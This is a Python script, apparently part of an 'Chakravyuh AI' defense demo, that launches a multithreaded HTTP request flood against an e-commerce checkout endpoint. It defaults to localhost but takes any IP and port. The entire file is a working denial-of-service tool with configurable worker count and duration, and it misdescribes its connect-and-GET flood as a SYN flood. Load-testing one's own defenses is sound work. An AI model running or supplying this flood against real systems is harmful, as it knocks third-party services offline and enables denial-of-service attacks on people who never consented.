#!/usr/bin/env python3
"""
Chakravyuh AI: High-Density Traffic / SYN Flood Simulator
Simulates a high-frequency DoS/LOIC-HTTP traffic surge against the defense target or demo e-commerce storefront.
"""

import socket
import sys
import time
import threading
import argparse

stop_event = threading.Event()

def flood_worker(target_ip: str, target_port: int, worker_id: int):
    payload = (
        b"GET /api/checkout HTTP/1.1\r\n"
        b"Host: " + target_ip.encode() + b"\r\n"
        b"User-Agent: Chakravyuh-Bench/2.0 (Adversarial-Simulator)\r\n"
        b"Accept: */*\r\n"
        b"Connection: close\r\n\r\n"
    )
    
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            s.sendall(payload)
            s.close()
        except Exception:
            pass
        time.sleep(0.001)

def start_traffic_flood(target_ip: str = "127.0.0.1", target_port: int = 5000, threads: int = 24, duration: int = 10):
    print(f"==================================================")
    print(f"[ATTACK SIMULATION] Launching High-Density Traffic Surge on {target_ip}:{target_port}")
    print(f"Target: Port {target_port} (E-Commerce Demo Storefront / API)")
    print(f"Workers: {threads} | Duration: {duration}s")
    print(f"==================================================")
    
    stop_event.clear()
    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_port, i))
        t.daemon = True
        t.start()
        thread_pool.append(t)
        
    try:
        for remaining in range(duration, 0, -1):
            sys.stdout.write(f"\r[⚡] Flood surge active on port {target_port}... {remaining}s remaining (Press Ctrl+C to abort) ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAborted by user.")
        
    stop_event.set()
    print(f"\n[✓] Traffic flood simulation on {target_ip}:{target_port} finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Chakravyuh AI: High-Density Traffic / DoS Flood Simulator")
    parser.add_argument("target", nargs="?", default="127.0.0.1", help="Target Defense IP (default: 127.0.0.1)")
    parser.add_argument("port", nargs="?", type=int, default=5000, help="Target Port (default: 5000 for E-Commerce / 8000 for API)")
    parser.add_argument("--workers", "--threads", "-w", "-t", type=int, default=24, help="Concurrent workers (default: 24)")
    parser.add_argument("--duration", "-d", type=int, default=10, help="Duration in seconds (default: 10)")

    args, unknown = parser.parse_known_args()
    start_traffic_flood(args.target, args.port, args.workers, args.duration)
